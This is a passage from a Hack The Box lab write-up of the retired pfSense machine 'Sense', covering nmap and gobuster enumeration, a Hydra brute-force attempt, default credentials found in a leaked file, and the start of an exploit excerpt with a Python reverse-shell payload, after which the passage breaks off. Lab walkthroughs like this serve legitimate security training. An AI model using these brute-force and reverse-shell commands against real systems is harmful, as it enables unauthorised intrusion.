<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Sense Writeup wo Metasploit/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>26. Sense Writeup w/o Metasploit.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#reconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                26. Sense Writeup w/o Metasploit.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
      8. Poison Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
      15. Valentine Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
      17. Cronos Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
    <a href="./" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
      26. Sense Writeup w/o Metasploit.md
    </a>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
      27. Sunday Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Sense Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_ImTgbA-g16F9oCfvrjvMDg.png" /></p>
<p>This is the 18th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
<p>Let’s get started!</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA initial 10.10.10.60
</pre></div>

<ul>
<li>
<p><strong>-sC</strong>: run default nmap scripts</p>
</li>
<li>
<p><strong>-sV</strong>: detect service version</p>
</li>
<li>
<p><strong>-O</strong>: detect OS</p>
</li>
<li>
<p><strong>-oA</strong>: output all formats and store in file <em>initial</em></p>
</li>
</ul>
<p>We get back the following result showing that 2 ports are open:</p>
<ul>
<li>
<p>Port 80: running lighttpd 1.4.35 over HTTP</p>
</li>
<li>
<p>Port 443: running lighttpd 1.4.35 over HTTPS</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:29 EST
<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.60
<span class="lineno" data-linenos=" 3 "></span>Host is up (0.034s latency).
<span class="lineno" data-linenos=" 4 "></span>Not shown: 998 filtered ports
<span class="lineno" data-linenos=" 5 "></span>PORT    STATE SERVICE    VERSION
<span class="lineno" data-linenos=" 6 "></span>80/tcp  open  http       lighttpd 1.4.35
<span class="lineno" data-linenos=" 7 "></span>|_http-server-header: lighttpd/1.4.35
<span class="lineno" data-linenos=" 8 "></span>|_http-title: Did not follow redirect to [https://10.10.10.60/](https://10.10.10.60/)
<span class="lineno" data-linenos=" 9 "></span>|_https-redirect: ERROR: Script execution failed (use -d to debug)
<span class="lineno" data-linenos="10 "></span>443/tcp open  ssl/https?
<span class="lineno" data-linenos="11 "></span>|_ssl-date: TLS randomness does not represent time
<span class="lineno" data-linenos="12 "></span>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
<span class="lineno" data-linenos="13 "></span>Device type: general purpose
<span class="lineno" data-linenos="14 "></span>Running (JUST GUESSING): OpenBSD 4.X (94%)
<span class="lineno" data-linenos="15 "></span>OS CPE: cpe:/o:openbsd:openbsd:4.0
<span class="lineno" data-linenos="16 "></span>Aggressive OS guesses: OpenBSD 4.0 (94%), OpenBSD 4.3 (91%)
<span class="lineno" data-linenos="17 "></span>No exact OS matches for host (test conditions non-ideal).
<span class="lineno" data-linenos="18 "></span>
<span class="lineno" data-linenos="19 "></span>OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="20 "></span>Nmap done: 1 IP address (1 host up) scanned in 117.20 seconds
</pre></div>

<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
<p>Let’s run an nmap scan that covers all ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -p- -oA full 10.10.10.60
</pre></div>

<p>No other ports are open.</p>
<p>Similarly, we run an nmap scan with the <strong>-sU </strong>flag enabled to run a UDP scan.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sU -p- -oA udp 10.10.10.60
</pre></div>

<p>We get back the following result showing no ports are open.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-28 23:45 EST
<span class="lineno" data-linenos="2 "></span>Nmap scan report for 10.10.10.60
<span class="lineno" data-linenos="3 "></span>Host is up (0.063s latency).
<span class="lineno" data-linenos="4 "></span>All 65535 scanned ports on 10.10.10.60 are open|filtered
<span class="lineno" data-linenos="5 "></span>
<span class="lineno" data-linenos="6 "></span>Nmap done: 1 IP address (1 host up) scanned in 4151.01 seconds
</pre></div>

<p>Before we move on to enumeration, let’s make a mental note about the nmap scan results.</p>
<ul>
<li>Port 80 redirects to port 443 so we really only have one port to enumerate.</li>
</ul>
<h1 id="enumeration">Enumeration</h1>
<p>Let’s start enumerating port 443. Visit the application using the browser.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_3PQ-rrGuyauSEoL-GAf0hQ.png" /></p>
<p>We get a pfSense login page. pfSense is a free and open-source firewall and router. Since it is an off the shelf software, the first thing I did is google “pfsense default credentials” and found the following page.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_pIFf8wDOwNq1HAA5-mh1NQ.png" /></p>
<p>I tried admin/pfsense but that did not work. I also tried common credentials such as admin/admin, pfsense/pfsense, admin/password, etc.</p>
<p>When that didn’t work I had a not-so-bright-idea of brute forcing the credentials using Hydra.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form &quot;/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&amp;usernamefld=^USER^&amp;passwordfld=^PASS^&amp;login=Login:Username or Password incorrect&quot;
</pre></div>

<p>That ended up getting me blocked. In hindsight it makes sense. It wasn’t very smart to brute force the credentials of a firewall.</p>
<p>Next, I ran gobuster to enumerate directories.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k
</pre></div>

<ul>
<li>
<p><strong>dir: </strong>uses directory/file brute forcing mode.</p>
</li>
<li>
<p><strong>-w:</strong> path to the wordlist.</p>
</li>
<li>
<p><strong>-u: </strong>the target URL or Domain.</p>
</li>
<li>
<p><strong>-k: </strong>skip SSL certificate verification.</p>
</li>
</ul>
<p>I got back the following results.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>===============================================================
<span class="lineno" data-linenos=" 2 "></span>Gobuster v3.0.1
<span class="lineno" data-linenos=" 3 "></span>by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) &amp; Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_))
<span class="lineno" data-linenos=" 4 "></span>===============================================================
<span class="lineno" data-linenos=" 5 "></span>[+] Url:            [https://10.10.10.60](https://10.10.10.60)
<span class="lineno" data-linenos=" 6 "></span>[+] Threads:        10
<span class="lineno" data-linenos=" 7 "></span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="lineno" data-linenos=" 8 "></span>[+] Status codes:   200,204,301,302,307,401,403
<span class="lineno" data-linenos=" 9 "></span>[+] User Agent:     gobuster/3.0.1
<span class="lineno" data-linenos="10 "></span>[+] Timeout:        10s
<span class="lineno" data-linenos="11 "></span>===============================================================
<span class="lineno" data-linenos="12 "></span>2019/12/29 00:03:57 Starting gobuster
<span class="lineno" data-linenos="13 "></span>===============================================================
<span class="lineno" data-linenos="14 "></span>/themes (Status: 301)
<span class="lineno" data-linenos="15 "></span>/css (Status: 301)
<span class="lineno" data-linenos="16 "></span>/includes (Status: 301)
<span class="lineno" data-linenos="17 "></span>/javascript (Status: 301)
<span class="lineno" data-linenos="18 "></span>/classes (Status: 301)
<span class="lineno" data-linenos="19 "></span>/widgets (Status: 301)
<span class="lineno" data-linenos="20 "></span>/tree (Status: 301)
<span class="lineno" data-linenos="21 "></span>/shortcuts (Status: 301)
<span class="lineno" data-linenos="22 "></span>/installer (Status: 301)
<span class="lineno" data-linenos="23 "></span>/wizards (Status: 301)
<span class="lineno" data-linenos="24 "></span>/csrf (Status: 301)
<span class="lineno" data-linenos="25 "></span>/filebrowser (Status: 301)
<span class="lineno" data-linenos="26 "></span>/%7Echeckout%7E (Status: 403)
<span class="lineno" data-linenos="27 "></span>===============================================================
<span class="lineno" data-linenos="28 "></span>2019/12/29 00:30:17 Finished
<span class="lineno" data-linenos="29 "></span>===============================================================
</pre></div>

<p>I didn’t get anything useful.</p>
<p>Next, run searchsploit to view if the software is associated with any vulnerabilities.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>searchsploit pfsense
</pre></div>

<p>We get back the following result.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_vom2AvJDOY6T-oju6gvV8A.png" /></p>
<p>Nothing really pops out. Most of the exploits require authentication. At this point, I would have given up on this port and started enumerating another port. However, this is the only port we can enumerate for this machine. So we have to find something with gobuster.</p>
<p>Let’s change our gobuster command to include extensions.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [https://10.10.10.60](https://10.10.10.60) -k -x php,txt,conf
</pre></div>

<ul>
<li><strong>-x: </strong>file extension(s) to search for</li>
</ul>
<p>I added the extensions txt &amp; conf to look for any configuration files or text files left by system administrators.</p>
<p>We get back the following result.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>===============================================================
<span class="lineno" data-linenos=" 2 "></span>Gobuster v3.0.1
<span class="lineno" data-linenos=" 3 "></span>by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) &amp; Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_))
<span class="lineno" data-linenos=" 4 "></span>===============================================================
<span class="lineno" data-linenos=" 5 "></span>[+] Url:            [https://10.10.10.60](https://10.10.10.60)
<span class="lineno" data-linenos=" 6 "></span>[+] Threads:        10
<span class="lineno" data-linenos=" 7 "></span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="lineno" data-linenos=" 8 "></span>[+] Status codes:   200,204,301,302,307,401,403
<span class="lineno" data-linenos=" 9 "></span>[+] User Agent:     gobuster/3.0.1
<span class="lineno" data-linenos="10 "></span>[+] Extensions:     php,txt,conf
<span class="lineno" data-linenos="11 "></span>[+] Timeout:        10s
<span class="lineno" data-linenos="12 "></span>===============================================================
<span class="lineno" data-linenos="13 "></span>2019/12/29 09:28:51 Starting gobuster
<span class="lineno" data-linenos="14 "></span>===============================================================
<span class="lineno" data-linenos="15 "></span>/index.php (Status: 200)
<span class="lineno" data-linenos="16 "></span>/help.php (Status: 200)
<span class="lineno" data-linenos="17 "></span>/themes (Status: 301)
<span class="lineno" data-linenos="18 "></span>/stats.php (Status: 200)
<span class="lineno" data-linenos="19 "></span>/css (Status: 301)
<span class="lineno" data-linenos="20 "></span>/edit.php (Status: 200)
<span class="lineno" data-linenos="21 "></span>/includes (Status: 301)
<span class="lineno" data-linenos="22 "></span>/license.php (Status: 200)
<span class="lineno" data-linenos="23 "></span>/system.php (Status: 200)
<span class="lineno" data-linenos="24 "></span>/status.php (Status: 200)
<span class="lineno" data-linenos="25 "></span>/javascript (Status: 301)
<span class="lineno" data-linenos="26 "></span>/changelog.txt (Status: 200)
<span class="lineno" data-linenos="27 "></span>/classes (Status: 301)
<span class="lineno" data-linenos="28 "></span>/exec.php (Status: 200)
<span class="lineno" data-linenos="29 "></span>/widgets (Status: 301)
<span class="lineno" data-linenos="30 "></span>/graph.php (Status: 200)
<span class="lineno" data-linenos="31 "></span>/tree (Status: 301)
<span class="lineno" data-linenos="32 "></span>/wizard.php (Status: 200)
<span class="lineno" data-linenos="33 "></span>/shortcuts (Status: 301)
<span class="lineno" data-linenos="34 "></span>/pkg.php (Status: 200)
<span class="lineno" data-linenos="35 "></span>/installer (Status: 301)
<span class="lineno" data-linenos="36 "></span>/wizards (Status: 301)
<span class="lineno" data-linenos="37 "></span>/xmlrpc.php (Status: 200)
<span class="lineno" data-linenos="38 "></span>/reboot.php (Status: 200)
<span class="lineno" data-linenos="39 "></span>/interfaces.php (Status: 200)
<span class="lineno" data-linenos="40 "></span>/csrf (Status: 301)
<span class="lineno" data-linenos="41 "></span>/system-users.txt (Status: 200)
<span class="lineno" data-linenos="42 "></span>/filebrowser (Status: 301)
<span class="lineno" data-linenos="43 "></span>/%7Echeckout%7E (Status: 403)
</pre></div>

<p>Two files that immediately catch my eye are changelog.txt &amp; system-users.txt.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_jRsyREuNyULhMXjRnLj3Kw.png" /></p>
<p>The change-log.txt file tells us that they’re definitely using a vulnerable version of pfSense. However, they did patch two of the three vulnerabilities that are associated with this software. We have to keep that in mind when exploiting the application.</p>
<p>The system-users.txt file gives us credentials!</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_BQz3D5xII-W4P6XHDmpFZg.png" /></p>
<p>The username is <strong>rohit </strong>and the password is the default password <strong>pfsense</strong>. Let’s log into the application.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_RUQXFAarmJ1LmoMTxiIdtA.png" /></p>
<p>The version number is 2.1.3. If we go back to our searchsploit results, one exploit does stand out.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_1JawlP5h4L_nNyUrMdRGpQ.png" /></p>
<h1 id="exploitation">Exploitation</h1>
<p>Transfer the exploit to our directory.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>searchsploit -m 43560.py
</pre></div>

<p>Let’s look at the<a href="https://www.exploit-db.com/exploits/43560"> exploit</a> to see what it’s doing.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>.....
<span class="lineno" data-linenos=" 2 "></span>
<span class="lineno" data-linenos=" 3 "></span>`# command to be converted into octal
<span class="lineno" data-linenos=" 4 "></span>command = &quot;&quot;&quot;
<span class="lineno" data-linenos=" 5 "></span>python -c &#39;import socket,subprocess,os;
<span class="lineno" data-linenos=" 6 "></span>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
<span class="lineno" data-linenos=" 7 "></span>s.connect((&quot;%s&quot;,%s));
<span class="lineno" data-linenos=" 8 "></span>os.dup2(s.fileno(),0);
<span class="lineno" data-linenos=" 9 "></span>os.dup2(s.fileno(),1);
<span class="lineno" data-linenos="10 "></span>os.dup2(s.fileno(),2);
<span class="lineno" data-linenos="11 "></span>p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
